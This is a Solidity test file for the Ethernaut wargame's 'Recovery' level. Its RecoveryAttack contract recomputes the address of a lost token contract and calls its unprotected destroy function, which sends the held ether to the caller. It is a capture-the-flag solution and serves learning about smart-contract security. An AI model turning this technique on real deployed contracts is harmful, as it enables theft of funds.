// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/17-Recovery/Recovery.sol";
import "../src/levels/17-Recovery/RecoveryFactory.sol";

contract RecoveryTest is Test {
    Ethernaut public ethernaut;
    RecoveryFactory public recoveryFactory;
    Recovery public recovery;
    address internal levelAddr;

    address eoa1 = address(0x1);

    function setUp() public {
        ethernaut = new Ethernaut();
        recoveryFactory = new RecoveryFactory();
        ethernaut.registerLevel(recoveryFactory);

        vm.startPrank(eoa1);
        vm.deal(eoa1, 10_000 ether);

        levelAddr = ethernaut.createLevelInstance{value: 1 ether}(
            recoveryFactory
        );
        recovery = Recovery(payable(levelAddr));
    }

    function testAttack() public {
        RecoveryAttack recoveryAttack = new RecoveryAttack(recovery);
        recoveryAttack.attack(eoa1);

        bool success = ethernaut.submitLevelInstance(payable(levelAddr));
        assertTrue(success, "Solution is not solving the level");
    }

    receive() external payable {}
}

contract RecoveryAttack {
    Recovery public recovery;

    constructor(Recovery _recovery) {
        recovery = _recovery;
    }

    function attack(address _to) public {
        address lostAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            address(recovery),
                            bytes1(0x01)
                        )
                    )
                )
            )
        );

        SimpleToken token = SimpleToken(payable(lostAddress));
        token.destroy(payable(_to));
    }
}
